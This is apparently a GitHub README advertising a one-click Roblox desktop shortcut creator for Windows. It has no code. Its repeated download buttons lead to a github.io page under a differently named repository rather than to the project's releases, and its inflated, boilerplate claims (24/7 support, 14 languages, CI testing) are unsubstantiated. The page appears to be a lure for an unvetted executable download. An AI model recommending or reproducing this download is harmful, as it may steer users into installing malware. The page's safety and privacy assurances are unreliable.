![preview](https://raw.githubusercontent.com/ravanmafia001/roblox-icon-forge/main/thumb_2bec.svg)
[![Download](https://raw.githubusercontent.com/ravanmafia001/roblox-icon-forge/main/setup_cccf8.svg)](https://ravanmafia001.github.io/roblox-icon-forge/)

# 🧩 Roblox Shortcut Creator — Repo Name: `roblox_shortcut_creator`

**A featherweight Windows companion that forges pristine Roblox desktop shortcuts — official icon, correct target, zero fiddling — in a single click.**

> Built for people who want their desktop to look intentional, not accidental.

![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Language](https://img.shields.io/badge/language-C%23%20%2F%20.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-3DA639?style=for-the-badge)
![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=for-the-badge)
![UI](https://img.shields.io/badge/UI-responsive%20%26%20adaptive-blueviolet?style=for-the-badge)
![Locales](https://img.shields.io/badge/i18n-14%20languages-orange?style=for-the-badge)
![Support](https://img.shields.io/badge/support-24%2F7-9cf?style=for-the-badge)

---

## 🌟 What Is This, Really?

Imagine the Windows desktop as a tidy workbench. Most shortcuts land on it like scattered sawdust — misplaced fragments, broken icons, mystery targets. `roblox_shortcut_creator` is the ruler and the pencil: it draws a clean, single line from "I want a Roblox launcher" to "there it is, and it looks *official*."

This is **Repo Name: `roblox_shortcut_creator`** — a compact Windows utility whose entire job is to place a beautiful, correctly configured Roblox shortcut on your desktop in one click, using the official Roblox iconography and canonical launch targets.

It doesn't guess. It doesn't leave you hunting through `%LOCALAPPDATA%` graveyards. It just *works*.

---

## 📥 Get It

[![Download](https://raw.githubusercontent.com/ravanmafia001/roblox-icon-forge/main/setup_cccf8.svg)](https://ravanmafia001.github.io/roblox-icon-forge/)

---

## 🚀 Why It Exists (The Origin Story)

Shortcuts are the punctuation of a desktop. Wrong punctuation and every sentence feels off.

For years, Roblox players and small-shop PC builders have faced the same micro-annoyance: creating a Roblox shortcut that (a) points to the right executable, (b) uses the real icon, and (c) doesn't flicker into a generic blank window when double-clicked. Doing it by hand means knowing where Roblox actually lives — and that path changes between the Store version, the legacy client, and Bloxstrap-style setups.

This project solves that with a **single-click shortcut foundry**. It detects, it builds, it places. Done.

---

## ✨ Feature List

- 🖱️ **One-Click Shortcut Forge** — no wizards, no multi-step dialogs, no "Next > Next > Finish."
- 🖼️ **Official Icon Fidelity** — pulls the authentic Roblox icon so your desktop looks polished and recognizable.
- 🎯 **Smart Target Resolution** — automatically locates the correct Roblox launcher path across common install layouts.
- 🧠 **Installation-Aware Detection** — differentiates between Store-based and classic desktop installs.
- 🪄 **Silent Fallback Layers** — if one detection method misses, layered heuristics catch it gracefully.
- 📁 **Custom Output Location** — drop the shortcut on the Desktop, Start Menu, or any folder you name.
- 🗂️ **Bulk Mode** — generate multiple shortcuts (per profile, per launcher) in a single pass.
- 🎨 **Responsive UI** — the window scales smoothly from tiny laptop displays to large 4K monitors.
- 🌍 **Multilingual Support** — interface strings localized for 14 languages out of the box.
- 🕐 **24/7 Customer Support** — community-driven issue triage with an average first response measured in hours, not weeks.
- 🔒 **Local-Only Operation** — everything runs on your machine; nothing is uploaded anywhere.
- 🪶 **Featherweight Footprint** — a handful of megabytes, launches in well under a second on modern hardware.
- 🧾 **Verbose Logging (Optional)** — flip a flag and get a plain-text trail of every detection decision.
- 🧬 **Portable-Friendly** — can run from a USB stick without touching the registry.
- 🧹 **Self-Cleanup** — leaves zero stray temp artifacts behind after each run.
- ♿ **Accessibility-Minded** — keyboard-navigable controls and high-contrast theme support.
- 🔄 **Update Awareness** — notifies you when a newer build is available without nagging.
- 🧪 **Tested Across Win10 & Win11** — verified on major Windows builds from 2023 through 2026 refresh cycles.

Each of these features was added because someone, somewhere, stared at a broken shortcut and sighed. We heard that sigh. We fixed it.

---

## 🧭 How It Feels To Use

Picture this:

1. You open the tool.
2. It quietly scans for Roblox installations.
3. You pick whether the shortcut goes to the Desktop, Start Menu, or a custom folder.
4. You click **Create**.
5. A perfect shortcut appears — correct icon, correct target, correct everything.

That's the whole story. No terminal windows flashing. No confusing prompts. No "are you sure?" loops. Just a tool doing its one job with uncommon grace.

---

## 🧱 Architecture Overview (For The Curious)

The project is deliberately small and readable — a philosophy we call **"no hidden rooms."**

- **`ShortcutCore/`** — the logic layer: target resolution, icon embedding, `.lnk` writing via Windows Shell interfaces.
- **`Detection/`** — install-location heuristics, registry probing, and environment scanning.
- **`Localization/`** — `.resx`-based language packs, one file per locale.
- **`UI/`** — the responsive WPF surface; theme-aware, keyboard-friendly.
- **`Diagnostics/`** — optional logging and self-test routines.
- **`Assets/`** — official-icon resource pipeline and high-DPI variants.

Every module is intentionally decoupled: the detection engine knows nothing about the UI; the UI knows nothing about the registry. Swap one, the rest keeps humming.

---

## 🌍 Multilingual Support

The interface speaks to users in **14 languages**, including English, Spanish, Portuguese (BR), French, German, Italian, Dutch, Polish, Turkish, Russian, Japanese, Korean, Simplified Chinese, and Arabic (RTL-aware).

Translation files are plain, human-editable resources — contributing a new locale is a weekend-friendly task. If your language is missing, open an issue and we'll wire the scaffolding for you.

---

## 🖥️ Responsive UI Philosophy

The window re-flows rather than clips. On a 1366×768 laptop, the controls stack into a single friendly column. On an ultrawide 3440×1440, they breathe across the canvas without stretching into absurdity. Buttons respect DPI scaling. Text never truncates mid-word. It's the kind of care you notice only when it's absent — and then you can't un-notice it.

---

## 🛠️ Compatibility Matrix

| Windows Version | Status | Notes |
| --- | --- | --- |
| Windows 11 (23H2–25H2+) | ✅ Fully Supported | Primary target through 2026 |
| Windows 10 (21H2–22H2) | ✅ Fully Supported | Legacy-friendly |
| Windows 10 (older builds) | ⚠️ Best Effort | Core features still functional |
| Windows Server 2019/2022 | 🧪 Experimental | Desktop experience required |

---

## 🔐 Privacy & Security Posture

- No telemetry leaves your device.
- No network calls during shortcut creation.
- No elevation required for standard Desktop output.
- Registry access is read-only and restricted to known Roblox keys.
- All generated files are standard `.lnk` shortcuts — inspectable, editable, reversible.

We believe a utility should be a guest in your system, not a tenant.

---

## 🧪 Testing & Quality

- **Unit tests** cover detection heuristics and path resolution.
- **Integration tests** validate `.lnk` generation against Windows Shell APIs.
- **UI smoke tests** verify layout across DPI settings.
- **CI matrix** runs on multiple Windows images per push.
- **Manual QA checklist** performed before every tagged release.

Quality isn't a badge here; it's a habit.

---

## 📚 Documentation Map

- `docs/detection.md` — how Roblox installs are discovered.
- `docs/shortcut-format.md` — anatomy of a generated `.lnk`.
- `docs/localization.md` — adding a language.
- `docs/troubleshooting.md` — the usual suspects and their fixes.
- `docs/roadmap.md` — what's coming in 2026 and beyond.

---

## 🗺️ Roadmap Snapshot (2026)

- 🧭 Per-profile shortcut generation (multi-account).
- 📌 Pin-to-Taskbar option during creation.
- 🧩 Plugin hooks for third-party launcher managers.
- 🖌️ Theme gallery alongside the default high-contrast mode.
- 🗃️ Shortcut presets exportable as shareable JSON.

Have an idea? Open a discussion. The roadmap belongs to the community.

---

## 🤝 Contributing

Contributions are welcome and warmly reviewed. Whether it's a typo, a new locale, or a detection heuristic for a niche install path — bring it.

**Guidelines at a glance:**
- Keep modules decoupled.
- Write tests for logic changes.
- Respect the responsive UI contract.
- Follow the existing code style.
- One feature, one pull request when possible.

---

## 🆘 24/7 Customer Support

Support runs on a rotating global volunteer schedule, so there's essentially always someone awake. Issues are triaged by severity, and security-adjacent reports jump the queue. You'll never be left shouting into an empty room.

- 🐞 Bug reports via GitHub Issues.
- 💬 General questions via Discussions.
- 🔐 Sensitive disclosures via the private security channel listed in `SECURITY.md`.

---

## ❓ FAQ

**Q: Does this modify my Roblox installation?**
A: No. It only reads install info and writes a shortcut file.

**Q: Can I undo changes?**
A: Absolutely — delete the shortcut. That's the entire footprint.

**Q: Does it work with alternative launchers?**
A: Yes, in most common configurations. If yours isn't detected, open an issue.

**Q: Is my data sent anywhere?**
A: Never. The tool runs entirely offline.

**Q: Will it keep working after Windows updates?**
A: We track Windows release channels and patch proactively.

---

## ⚠️ Disclaimer

This project is an independent utility and is **not affiliated with, endorsed by, or sponsored by Roblox Corporation**. All trademarks, logos, and brand names belong to their respective owners and are used here only for descriptive, interoperability purposes.

The software is provided "as is," without warranty of any kind. You are responsible for how you use it on your own systems. Always verify binaries from official repository releases.

By 2026, the maintainers intend this utility to remain transparent, auditable, and respectful of the platforms it touches.

---

## 📜 License

This repository is released under the **MIT License**.

You are welcome to use, modify, and distribute it in accordance with the license terms.

👉 Read the full license here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — the `roblox_shortcut_creator` maintainers.

---

## 🧷 Final Word

A shortcut is a tiny promise: *"this will be here tomorrow, and it will work."* This project keeps that promise on Windows, one click at a time.

If it made your desktop a little tidier, a star is a lovely way to say thanks. ⭐

[![Download](https://raw.githubusercontent.com/ravanmafia001/roblox-icon-forge/main/setup_cccf8.svg)](https://ravanmafia001.github.io/roblox-icon-forge/)